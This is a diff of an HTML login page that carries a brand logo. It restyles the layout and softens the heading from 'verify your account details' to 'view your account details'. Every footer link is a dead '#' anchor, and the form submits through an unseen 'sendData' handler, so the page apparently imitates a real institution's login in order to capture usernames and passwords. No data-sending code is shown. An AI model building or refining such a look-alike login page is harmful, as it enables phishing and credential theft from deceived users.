@@ -20,15 +20,15 @@
     }
 
     .logo {
-      width: 150px;
+      width: 140px;
       margin-bottom: 20px;
     }
 
     .login-box {
-      background: #fff;
+      background: #f9f9f9;
       padding: 35px 30px;
-      border: 1px solid #d3d3d3;
-      border-radius: 8px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
       width: 100%;
       max-width: 400px;
     }
@@ -41,29 +41,25 @@
       color: #444;
     }
 
-    .input-group {
-      position: relative;
-      margin-bottom: 20px;
+    .login-box label {
+      display: block;
+      font-weight: bold;
+      font-size: 14px;
+      margin-top: 10px;
+      color: #333;
     }
 
-    .input-group input {
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
       width: 100%;
-      padding: 10px 40px 10px 10px;
-      font-size: 15px;
+      padding: 10px;
+      margin-top: 5px;
       border: 1px solid #ccc;
       border-radius: 4px;
+      font-size: 15px;
     }
 
-    .input-group .icon {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 16px;
-      color: #666;
-    }
-
-    input[type="submit"] {
+    .login-box input[type="submit"] {
       width: 100%;
       padding: 12px;
       background: #333;
@@ -73,26 +69,33 @@
       font-weight: bold;
       font-size: 16px;
       cursor: pointer;
+      margin-top: 20px;
     }
 
-    input[type="submit"]:hover {
+    .login-box input[type="submit"]:hover {
       background: #000;
     }
 
     .footer-links {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 15px;
+      text-align: center;
+      margin-top: 20px;
       font-size: 14px;
     }
 
     .footer-links a {
       color: #007bff;
       text-decoration: none;
+      display: inline-block;
+      margin: 0 10px;
     }
 
     .footer-links a:hover {
       text-decoration: underline;
+    }
+
+    .footer-links .single-link {
+      display: block;
+      margin-top: 8px;
     }
   </style>
 </head>
@@ -102,24 +105,20 @@
   <img src="HW_Logos_FINAL_Full_Color-Secondary-768x221-1.png" alt="Logo" class="logo">
 
   <form class="login-box" onsubmit="sendData(event)">
-    <h2>Please log in with your credentials to verify your account details.</h2>
+    <h2>Please log in with your credentials to view your account details.</h2>
 
-    <div class="input-group">
-      <input type="text" id="username" placeholder="Enter Username" required />
-      <span class="icon">🔑</span>
-    </div>
+    <label for="username">Username</label>
+    <input type="text" id="username" placeholder="Enter Username" required />
 
-    <div class="input-group">
-      <input type="password" id="password" placeholder="Enter Password" required />
-      <span class="icon">👁️</span>
-    </div>
+    <label for="password">Password</label>
+    <input type="password" id="password" placeholder="Enter Password" required />
 
     <input type="submit" value="Log In" />
 
     <div class="footer-links">
       <a href="#">Enroll</a>
       <a href="#">Forgot Password</a>
-      <a href="#">Unlock Account</a>
+      <a href="#" class="single-link">Unlock Account</a>
     </div>
   </form>
 </div>
